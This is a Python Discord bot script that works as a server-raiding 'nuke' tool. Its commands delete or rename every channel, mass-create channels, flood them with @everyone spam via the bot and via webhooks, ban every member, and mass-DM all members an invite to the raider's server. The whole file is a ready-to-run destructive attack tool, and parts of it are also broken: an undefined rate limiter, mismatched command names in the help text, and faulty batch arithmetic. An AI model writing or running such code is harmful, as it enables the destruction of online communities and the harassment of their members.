import discord
import asyncio
import re
import os
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=",", intents=intents, help_command=None)
TOKEN = os.getenv("DISCORD_TOKEN")

DEFAULT_CONFIG = {
    "channels": 500,
    "channel-name": "/chrxmaticc owns evb",
    "pings": 30,
    "server-name": "moving to /chrxmaticc",
    "webhook-name": "disc",
    "message": "moving servers: https://discord.gg/chrxmaticc  @everyone"
}

def parse_inline_config(content):
    config = DEFAULT_CONFIG.copy()
    match = re.search(r'-edit\s*\{([^}]+)\}', content, re.DOTALL)
    if match:
        block = match.group(1)
        block = re.sub(r'//.*$', '', block, flags=re.MULTILINE)
        pairs = re.findall(r'"([^"]+)":\s*(?:"([^"]*)"|(\d+))\s*;', block)
        for key, val_str, val_int in pairs:
            if val_int:
                config[key] = int(val_int)
            else:
                config[key] = val_str

    config["channels"] = max(50, min(500, config.get("channels", 500)))
    config["pings"] = max(1, min(15, config.get("pings", 15)))
    return config

async def run_webhook_spam(channel, webhook_name, message, ping_count):
    try:
        webhook = await channel.create_webhook(name=webhook_name)
        tasks = [webhook.send(message) for _ in range(ping_count)]
        await asyncio.gather(*tasks, return_exceptions=True)
    except discord.HTTPException:
        pass

async def run_bot_spam(channel, message, ping_count):
    try:
        tasks = [channel.send(message) for _ in range(ping_count)]
        await asyncio.gather(*tasks, return_exceptions=True)
    except discord.HTTPException:
        pass

@bot.command(name="help")
async def help_command(ctx):
    help_text = (
        "> **Available Commands:**\n\n"
        "> `,help` - Displays this breakdown menu\n"
        "> `,nvke1` - Rename all channels and use webhooks to sp*m them\n"
        "> `,nvke2` - Rename all channels and use the bot to sp*m them\n"
        "> `,nvke3` - Do not rename channels and use webhooks to sp*m every channel\n"
        "> `,nvke4` - Do not rename channels and use the bot to sp*m every channel\n"
        "> `,nvke5` - Delete all channels, create new ones, and use webhooks t spam\n"
        "> `,nvke6` - Delete all channels, create new ones, and use b0t to spam\n"
        "> `,banall` - Ban all members from the server\n"
        "> `,dmall` - DM all members with a relocation link\n\n"
        "> **Inline Config Example:**\n"
        "```\n"
        ",nvke1 -edit {\n"
        "    \"channels\": 500;\n"
        "    \"channel-name\": \"Test\";\n"
        "    \"pings\": 15;\n"
        "    \"server-name\": \"Test\";\n"
        "    \"webhook-name\": \"Test\";\n"
        "    \"message\": \"Test\";\n"
        "}\n"
        "```"
    )
    await ctx.send(help_text)

@bot.command(name="nuke1")
async def nuke1(ctx):
    cfg = parse_inline_config(ctx.message.content)
    guild = ctx.guild
    rename_tasks = [ch.edit(name=cfg["channel-name"]) for ch in guild.channels]
    await asyncio.gather(*rename_tasks, return_exceptions=True)
    spam_tasks = [run_webhook_spam(ch, cfg["webhook-name"], cfg["message"], cfg["pings"]) for ch in guild.channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)

@bot.command(name="nuke2")
async def nuke2(ctx):
    cfg = parse_inline_config(ctx.message.content)
    guild = ctx.guild
    rename_tasks = [ch.edit(name=cfg["channel-name"]) for ch in guild.channels]
    await asyncio.gather(*rename_tasks, return_exceptions=True)
    spam_tasks = [run_bot_spam(ch, cfg["message"], cfg["pings"]) for ch in guild.channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)

@bot.command(name="nuke3")
async def nuke3(ctx):
    cfg = parse_inline_config(ctx.message.content)
    guild = ctx.guild
    spam_tasks = [run_webhook_spam(ch, cfg["webhook-name"], cfg["message"], cfg["pings"]) for ch in guild.channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)

@bot.command(name="nuke4")
async def nuke4(ctx):
    cfg = parse_inline_config(ctx.message.content)
    guild = ctx.guild
    spam_tasks = [run_bot_spam(ch, cfg["message"], cfg["pings"]) for ch in guild.channels]
    await asyncio.gather(*spam_tasks, return_exceptions=True)

@bot.command(name="nuke5")
async def nuke5(ctx):
    cfg = parse_inline_config(ctx.message.content)
    guild = ctx.guild
    channels_to_delete = [c for c in guild.channels if c.id != ctx.channel.id]
    await asyncio.gather(*(c.delete() for c in channels_to_delete), return_exceptions=True)
    
    created_count = 0
    while created_count < 50:
        
        batch_size = min(50, 5 - created_count)        
        creation_tasks = [guild.create_text_channel(cfg["channel-name"]) for _ in range(batch_size)]   
        results = await asyncio.gather(*creation_tasks, return_exceptions=True)
        valid_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]
        
        if not valid_channels:
            await asyncio.sleep(4)
            continue
            
        created_count += len(valid_channels)
        spam_tasks = [run_webhook_spam(ch, cfg["webhook-name"], cfg["message"], cfg["pings"]) for ch in valid_channels]
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(1)

@bot.command(name="nuke6")
async def nuke6(ctx):
    cfg = parse_inline_config(ctx.message.content)
    guild = ctx.guild
    channels_to_delete = [c for c in guild.channels if c.id != ctx.channel.id]
    await asyncio.gather(*(c.delete() for c in channels_to_delete), return_exceptions=True)
    
    target_channels = cfg["channels"]
    created_count = 0
    while created_count < target_channels:

        batch_size = min(5, target_channels - created_count)
        creation_tasks = [guild.create_text_channel(cfg["channel-name"]) for _ in range(batch_size)]
        results = await asyncio.gather(*creation_tasks, return_exceptions=True)
        valid_channels = [ch for ch in results if isinstance(ch, discord.TextChannel)]
        
        if not valid_channels:
            await asyncio.sleep(4)
            continue
            
        created_count += len(valid_channels)
        spam_tasks = [run_bot_spam(ch, cfg["message"], cfg["pings"]) for ch in valid_channels]
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(1)

@bot.command(name="banall")
async def banall(ctx):
    guild = ctx.guild
    async def safe_ban(member):
        try:
            async with rate_limiter:
                await guild.ban(member, reason="whoops bye bye! go to discord.gg/chrxmaticc to join back!")
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after or 1)
        except:
            pass

    ban_tasks = [
        safe_ban(member)
        for member in guild.members                                           if member.id != ctx.author.id and member.id != guild.me.id
    ]
    await asyncio.gather(*ban_tasks, return_exceptions=True)

@bot.command(name="dmall")
async def dmall(ctx):
    guild = ctx.guild
    dm_tasks = [
        member.send(f"hy {member.mention} the server named {guild.name} is moving servers to https://discord.gg/chrxmaticc")
        for member in guild.members
        if not member.bot and member.id != ctx.author.id
    ]
    await asyncio.gather(*dm_tasks, return_exceptions=True)

bot.run(TOKEN)


